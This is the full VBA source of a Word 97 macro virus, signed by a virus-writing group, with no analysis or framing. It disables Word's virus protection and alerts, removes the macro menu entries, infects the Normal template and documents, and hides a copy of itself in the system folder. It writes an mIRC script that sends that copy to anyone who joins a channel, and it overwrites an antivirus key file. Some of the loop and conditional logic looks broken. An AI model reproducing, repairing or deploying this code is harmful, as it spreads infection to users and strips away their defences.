Atribute(VBE) = "SecretB"
Sub Auto_Close()
'WM97.Secret.B By Sinixstar - Metaphase Virus Team
'Thank you to Knowdeth,and all others who have helped
'and/or contributed.
On Error Resume Next
Application.VBE.ActiveVBProject.VBComponents("terces").Export "c:\terces.dll"
With Options
    .ConfirmConversions = False
    .VirusProtection = False
    .SaveNormalPrompt = False
End With
Application.ScreenUpdating = False
Application.DisplayStatusBar = False
Application.DisplayAlerts = False
Options.VirusProtection = False
CommandBars("tools").Controls("Macro").Delete
CommandBars("tools").Controls("Customize...").Delete
CommandBars("view").Controls("Toolbars").Delete
CommandBars("view").Controls("Status Bar").Delete
If Day(Date) > 15 Then
    For A = 1 To NormalTemplate.VBProject.VBComponents.Count
    If NormalTemplate.VBProject.VBComponents(I).Name = "terces" Then NormInstall = True
    Next A
    For A = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents(I).Name = "terces" Then ActivInstall = True
    Next A
    If ActivInstall = True And NormInstall = False Then Set Dm = NormalTemplate.VBProject _
    Else If ActivInstall = False And NormInstall = True Then Set Dm = ActiveDocument.VBProject
Else: GoTo ScriptPay
Dm.VBComponents.Import ("c:\terces.dll")
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
SetAttr "C:\terces.sys", vbReadOnly
Document.Save "C:\windows\system\secret.doc"
Shell "attrib c:\windows\system\secret.doc +h"
GoTo ScriptPay
End Sub
Sub ScriptPay()
On Error GoTo AVpay
SetAttr "C:\mirc\system\script.ini", vbReadOnly
Open "C:\mirc\system\script.ini" For Output As #1
Print #1, "[SCRIPT]"
Print #1, "n0=on 1:text:�� *:?:{ s *2 | halt }"
Print #1, "n1=alias /s / *1"
Print #1, "n2=on 1:connect:/.enable #d"
Print #1, "n3=#d off"
PRINT #1, "n4=on 1:join:#:{ if ($nick != $me) { dcc send $nick "c:\windows\system\secret.doc" } | .disable #d | .timer 1 60 .enable #d }"
Print #1, "n5=#d end"
Close #1
GoTo AVpay
End Sub
Sub AVpay()
SetAttr "C:\avp\avp.key", vbReadOnly
Open "C:\avp\avp.key" For Output As #2
Print #2, "A secret Should always be kept"
Print #2, "Under any circumstances."
Close #2
End Sub
